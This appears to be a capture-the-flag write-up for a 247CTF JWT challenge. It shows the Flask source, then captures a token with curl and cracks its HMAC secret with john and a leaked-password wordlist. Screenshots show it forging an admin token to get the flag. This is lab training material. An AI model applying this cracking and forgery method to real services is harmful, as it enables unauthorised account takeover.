Source Code:

```
from flask import Flask, redirect, url_for, make_response, render_template, flash
from flask_jwt_extended import JWTManager, create_access_token, jwt_optional, get_jwt_identity
from secret import secret, admin_flag, jwt_secret

app = Flask(__name__)
cookie = "access_token_cookie"

app.config['SECRET_KEY'] = secret
app.config['JWT_SECRET_KEY'] = jwt_secret
app.config['JWT_TOKEN_LOCATION'] = ['cookies']
app.config['DEBUG'] = False

jwt = JWTManager(app)

def redirect_to_flag(msg):
    flash('%s' % msg, 'danger')
    return redirect(url_for('flag', _external=True))

@jwt.expired_token_loader
def my_expired_token_callback():
    return redirect_to_flag('Token expired')

@jwt.invalid_token_loader
def my_invalid_token_callback(callback):
    return redirect_to_flag(callback)

@jwt_optional
def get_flag():
    if get_jwt_identity() == 'admin':
        return admin_flag

@app.route('/flag')
def flag():
    response = make_response(render_template('main.html', flag=get_flag()))
    response.set_cookie(cookie, create_access_token(identity='anonymous'))
    return response

@app.route('/')
def source():
    return "

%s

" % open(__file__).read()

if __name__ == "__main__":
    app.run()
```

looks like so authentication via JWT(json web token)

when access to "/flag" got the token of "anonymous"
however need the admin's token for flag...


step1: get the token

```
->$ curl -c - https://d50f43f4580f3280.247ctf.com/flag | grep access_token_cookie
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   863  100   863    0     0    706      0  0:00:01  0:00:01 --:--:--   706
d50f43f4580f3280.247ctf.com	FALSE	/	FALSE	0	access_token_cookieeyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJjc3JmIjoiNGQwMTM4OGQtMjYxMy00ZWIwLThhNGUtYWE3ZjgzMDk2NDM1IiwianRpIjoiZTg2MTc1OGItNmVkMi00ZGM5LTg5OGItZmE1ZDRmN2YxODc4IiwiZXhwIjoxNjY5NjEyOTk2LCJmcmVzaCI6ZmFsc2UsImlhdCI6MTY2OTYxMjA5NiwidHlwZSI6ImFjY2VzcyIsIm5iZiI6MTY2OTYxMjA5NiwiaWRlbnRpdHkiOiJhbm9ueW1vdXMifQ.y3OP7Q_--BwMApgg7sV4E2Ud-UrXCqUriMvXbg9GmNA
```
save the jwt to text_file: jwt.txt


step2: crack with john

```
->$ john jwt.txt --wordlist=/usr/share/wordlists/seclists/Passwords/Leaked-Databases/rockyou.txt --format=HMAC-SHA256
Using default input encoding: UTF-8
Loaded 1 password hash (HMAC-SHA256 [password is key, SHA256 128/128 AVX 4x])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
wepwn247         (?)     
1g 0:00:00:01 DONE (2022-11-28 04:58) 0.6666g/s 1856Kp/s 1856Kc/s 1856KC/s wermer7..wendy.jja9363
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```
we found the key


step3: change the username 

![image](https://user-images.githubusercontent.com/75846902/204198124-7d7e96e9-16f3-47c9-b28e-4e86e02bc994.png)

![image](https://user-images.githubusercontent.com/75846902/204198198-ec27c22d-ad4e-4a24-b530-f903e1e85efb.png)

![image](https://user-images.githubusercontent.com/75846902/204199055-a869f315-c70a-452a-b587-df20fdec9cfd.png)


step4: set the new jwt 

![image](https://user-images.githubusercontent.com/75846902/204199274-9dbdd58b-4c6e-4c64-9ce9-cdd4dd62dd31.png)

kaboom

![image](https://user-images.githubusercontent.com/75846902/204200827-4591200d-1f6c-46c2-8ccc-a303c89b44ac.png)










